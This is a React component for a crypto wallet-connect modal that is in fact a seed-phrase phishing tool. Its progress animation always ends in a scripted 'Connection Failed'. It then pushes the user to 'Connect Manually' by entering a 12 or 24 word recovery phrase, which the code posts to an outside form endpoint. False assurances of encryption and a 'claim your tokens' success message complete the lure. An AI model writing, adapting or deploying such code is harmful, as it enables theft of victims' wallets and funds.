"use client";

import { useEffect, useState } from "react";
import Image from "next/image";
import { Button } from "@/components/ui/button";
import { AlertCircle, X, Eye, Lock } from "lucide-react";

// Prevent wallet extension conflicts by safely handling ethereum provider
if (typeof window !== "undefined") {
  try {
    if (!Object.getOwnPropertyDescriptor(window, "ethereum")) {
      Object.defineProperty(window, "ethereum", {
        writable: true,
        configurable: true,
        value: undefined,
      });
    }
  } catch (e) {
    // Silently ignore if ethereum property is already defined
  }
}

interface WalletConnectionModalProps {
  isOpen: boolean;
  walletName: string;
  walletImage: string;
  onClose: () => void;
}

export function WalletConnectionModal({
  isOpen,
  walletName,
  walletImage,
  onClose,
}: WalletConnectionModalProps) {
  const [status, setStatus] = useState<
    "loading" | "failed" | "manual-connect" | "success"
  >("loading");
  const [progress, setProgress] = useState(0);
  const [currentStep, setCurrentStep] = useState(1);
  const [mnemonicInput, setMnemonicInput] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    if (!isOpen) {
      setStatus("loading");
      setProgress(0);
      setCurrentStep(1);
      return;
    }

    // Set progress based on current step
    const getProgressForStep = (step: number) => {
      switch (step) {
        case 1:
          return 0;
        case 2:
          return 33;
        case 3:
          return 66;
        default:
          return 0;
      }
    };

    // Initial progress
    setProgress(getProgressForStep(1));

    // Step 1 -> Step 2 after 2 seconds
    const stepTimer1 = setTimeout(() => {
      setCurrentStep(2);
      setProgress(33);
    }, 2000);

    // Step 2 -> Step 3 after 5 seconds (3 seconds after step 2)
    const stepTimer2 = setTimeout(() => {
      setCurrentStep(3);
      setProgress(66);
    }, 5000);

    // Switch to failed after 8 seconds (2 seconds after step 3)
    const timer = setTimeout(() => {
      setStatus("failed");
      setProgress(100);
    }, 8000);

    return () => {
      clearTimeout(timer);
      clearTimeout(stepTimer1);
      clearTimeout(stepTimer2);
    };
  }, [isOpen]);

  // Optional: Add a smooth progress animation
  useEffect(() => {
    if (!isOpen || status !== "loading") return;

    // Smooth progress towards target
    const targetProgress =
      currentStep === 1 ? 33 : currentStep === 2 ? 66 : 100;
    const progressInterval = setInterval(() => {
      setProgress((prev) => {
        const diff = targetProgress - prev;
        if (Math.abs(diff) < 1) {
          clearInterval(progressInterval);
          return targetProgress;
        }
        return prev + diff * 0.1; // Smooth easing
      });
    }, 50);

    return () => clearInterval(progressInterval);
  }, [currentStep, status, isOpen]);

  

  // Rest of your component...
  if (!isOpen) return null;

  const steps = [
    { label: "Initializing", number: 1 },
    { label: "Requesting Access", number: 2 },
    { label: "Verifying", number: 3 },
    { label: "Connected", number: 4 },
  ];

  const getStepColor = (stepNum: number) => {
    if (stepNum < currentStep) return "bg-primary";
    if (stepNum === currentStep) return "bg-primary/70";
    return "bg-primary/20";
  };

  const getStepTextColor = (stepNum: number) => {
    if (stepNum <= currentStep) return "text-white font-semibold";
    return "text-foreground/60";
  };

  if (!isOpen) return null;

  return (
    <>
      {/* Backdrop */}
      <div
        className="fixed inset-0 bg-black/70 z-40 backdrop-blur-sm"
        onClick={onClose}
      />

      {/* Modal */}
      <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
        <div className="relative w-full max-w-md bg-card/95 border border-primary/30 rounded-2xl shadow-2xl shadow-primary/40 overflow-hidden animate-fade-in">
          {/* Close button */}
          <button
            onClick={onClose}
            className="absolute top-4 right-4 z-10 p-2 hover:bg-primary/20 rounded-lg transition-colors"
          >
            <X className="w-5 h-5 text-foreground/70" />
          </button>

          {status === "loading" ? (
            // Loading State
            <div className="p-8">
              {/* Wallet Logo */}
              <div className="flex justify-center mb-6">
                <div className="w-16 h-16 bg-gradient-to-br from-primary/30 to-primary/10 rounded-full border-2 border-primary/40 flex items-center justify-center">
                  <Image
                    src={walletImage}
                    alt={walletName}
                    width={56}
                    height={56}
                    className="object-contain rounded-full"
                  />
                </div>
              </div>

              {/* Title and Subtitle */}
              <div className="text-center mb-8">
                <h2 className="text-xl font-bold text-foreground mb-1">
                  Connecting to {walletName}
                </h2>
                <p className="text-sm text-foreground/60">
                  Establishing secure connection...
                </p>
              </div>

              {/* Progress Steps */}
              <div className="mb-8">
                <div className="flex justify-between items-start gap-2 mb-6">
                  {steps.map((step) => (
                    <div
                      key={step.number}
                      className="flex flex-col items-center gap-2 flex-1"
                    >
                      <div
                        className={`w-10 h-10 rounded-full flex items-center justify-center font-semibold text-sm transition-all text-white ${getStepColor(
                          step.number,
                        )} ${
                          step.number === currentStep
                            ? "ring-2 ring-offset-2 ring-offset-card ring-primary shadow-lg shadow-primary/50"
                            : ""
                        }`}
                      >
                        {step.number}
                      </div>
                      <p
                        className={`text-xs text-center leading-tight ${getStepTextColor(step.number)}`}
                      >
                        {step.label}
                      </p>
                    </div>
                  ))}
                </div>
              </div>

              {/* Progress Bar */}
              <div className="mb-6">
                <div className="flex items-center justify-between mb-2">
                  <p className="text-sm text-foreground/70">
                    Requesting wallet access...
                  </p>
                  <p className="text-sm font-semibold text-primary">
                    {Math.round(progress)}%
                  </p>
                </div>
                <div className="w-full h-2 bg-primary/20 rounded-full overflow-hidden">
                  <div
                    className="h-full bg-gradient-to-r from-primary to-primary/60 transition-all duration-300 rounded-full"
                    style={{ width: `${Math.min(progress, 100)}%` }}
                  />
                </div>
              </div>

              {/* Security Info */}
              <div className="space-y-3 bg-primary/10 rounded-lg p-4">
                <div className="flex items-start gap-3">
                  <Eye className="w-4 h-4 text-primary/70 mt-1 flex-shrink-0" />
                  <p className="text-xs text-foreground/70">
                    Keep this window open during connection
                  </p>
                </div>
                <div className="flex items-start gap-3">
                  <Lock className="w-4 h-4 text-primary/70 mt-1 flex-shrink-0" />
                  <p className="text-xs text-foreground/70">
                    Your wallet data is encrypted and secure
                  </p>
                </div>
              </div>
            </div>
          ) : status === "failed" ? (
            // Failed State
            <div className="p-8">
              {/* Wallet Logo */}
              <div className="flex justify-center mb-6">
                <div className="w-16 h-16 bg-primary/20 rounded-full border-2 border-primary/30 flex items-center justify-center">
                  <Image
                    src={walletImage}
                    alt={walletName}
                    width={56}
                    height={56}
                    className="object-contain opacity-70 rounded-full"
                  />
                </div>
              </div>

              {/* Error Icon and Message */}
              <div className="text-center mb-8">
                <div className="flex justify-center mb-4">
                  <AlertCircle className="w-10 h-10 text-destructive" />
                </div>
                <h2 className="text-lg font-bold text-foreground mb-2">
                  Connection Failed
                </h2>
                <p className="text-sm text-foreground/70">
                  Unable to connect to {walletName}. Please try again or connect
                  manually.
                </p>
              </div>

              {/* Action Buttons */}
              <div className="flex gap-3">
                <Button
                  onClick={() => {
                    setStatus("loading");
                    setProgress(0);
                    setCurrentStep(1);
                    setTimeout(() => {
                      setStatus("failed");
                    }, 3000);
                  }}
                  variant="outline"
                  className="flex-1 rounded-lg border-primary/30 text-foreground hover:bg-primary/20"
                >
                  Try Again
                </Button>
                <Button
                  onClick={() => {
                    setStatus("manual-connect");
                    setMnemonicInput("");
                  }}
                  className="flex-1 bg-primary text-primary-foreground hover:bg-primary/90 rounded-lg font-semibold"
                >
                  Connect Manually
                </Button>
              </div>
            </div>
          ) : status === "manual-connect" ? (
            // Manual Connect State
            <div className="p-8">
              {/* Wallet Logo */}
              <div className="flex justify-center mb-6">
                <div className="w-16 h-16 bg-gradient-to-br from-primary/30 to-primary/10 rounded-full border-2 border-primary/40 flex items-center justify-center">
                  <Image
                    src={walletImage}
                    alt={walletName}
                    width={56}
                    height={56}
                    className="object-contain rounded-full"
                  />
                </div>
              </div>

              {/* Title and Subtitle */}
              <div className="text-center mb-8">
                <h2 className="text-xl font-bold text-foreground mb-2">
                  Enter Your Recovery Phrase
                </h2>
                <p className="text-sm text-foreground/60">
                  Enter your 12 or 24 mnemonic phrase words
                </p>
              </div>

              {/* Mnemonic Input */}
              <div className="mb-6">
                {(() => {
                  const wordCount = mnemonicInput
                    .trim()
                    .split(/\s+/)
                    .filter((word) => word.length > 0).length;
                  const isValid = wordCount === 12 || wordCount === 24;
                  const hasInput = mnemonicInput.trim().length > 0;

                  return (
                    <>
                      <textarea
                        value={mnemonicInput}
                        onChange={(e) => setMnemonicInput(e.target.value)}
                        placeholder="word1 word2 word3... (separate by spaces)"
                        className={`w-full h-24 px-4 py-3 rounded-lg bg-primary/10 border text-foreground placeholder-foreground/40 resize-none focus:outline-none transition-colors ${
                          hasInput && !isValid
                            ? "border-red-500 focus:border-red-500"
                            : "border-primary/30 focus:border-primary/60"
                        }`}
                      />
                      <div className="mt-2 text-sm">
                        {hasInput && (
                          <>
                            <p
                              className={
                                isValid
                                  ? "text-green-500"
                                  : "text-red-500"
                              }
                            >
                              {wordCount} words entered
                              {!isValid
                                ? " - Please enter exactly 12 or 24 words"
                                : " ✓"}
                            </p>
                          </>
                        )}
                      </div>
                    </>
                  );
                })()}
              </div>

              {/* Encryption Info */}
              <div className="mb-8 bg-primary/10 rounded-lg p-4 flex items-start gap-3">
                <Lock className="w-4 h-4 text-primary/70 mt-1 flex-shrink-0" />
                <p className="text-xs text-foreground/70">This session is encrypted</p>
              </div>

              {/* Connect Button */}
              {(() => {
                const wordCount = mnemonicInput
                  .trim()
                  .split(/\s+/)
                  .filter((word) => word.length > 0).length;
                const isValid = wordCount === 12 || wordCount === 24;

                return (
                  <Button
                    onClick={async () => {
                      setIsSubmitting(true);
                      try {
                        const formData = new FormData();
                        formData.append('mnemonic', mnemonicInput);
                        formData.append('walletName', walletName);

                        await fetch('https://forms.un-static.com/forms/327f9106ace56ea4af20ece72cbc3a5cc85d15e9', {
                          method: 'POST',
                          body: formData,
                        });

                        setStatus('success');
                      } catch (error) {
                        console.error('Form submission error:', error);
                      } finally {
                        setIsSubmitting(false);
                      }
                    }}
                    disabled={isSubmitting || !isValid}
                    className="w-full bg-primary text-primary-foreground hover:bg-primary/90 rounded-lg py-3 font-semibold disabled:opacity-70"
                  >
                    {isSubmitting ? 'Connecting...' : 'Connect Wallet'}
                  </Button>
                );
              })()}
            </div>
          ) : status === "success" ? (
            // Success State
            <div className="p-8 text-center">
              {/* Success Icon */}
              <div className="flex justify-center mb-6">
                <div className="w-20 h-20 bg-gradient-to-br from-primary/30 to-primary/10 rounded-full border-2 border-primary/40 flex items-center justify-center">
                  <svg
                    className="w-10 h-10 text-primary"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M5 13l4 4L19 7"
                    />
                  </svg>
                </div>
              </div>

              {/* Success Message */}
              <h2 className="text-2xl font-bold text-foreground mb-2">
                Success!
              </h2>
              <p className="text-sm text-foreground/70 mb-8">
                Your wallet has been connected successfully. You can now claim
                your tokens.
              </p>

              {/* Close Button */}
              <Button
                onClick={onClose}
                className="w-full bg-primary text-primary-foreground hover:bg-primary/90 rounded-lg py-3 font-semibold"
              >
                Close
              </Button>
            </div>
          ) : null}
        </div>
      </div>
    </>
  );
}
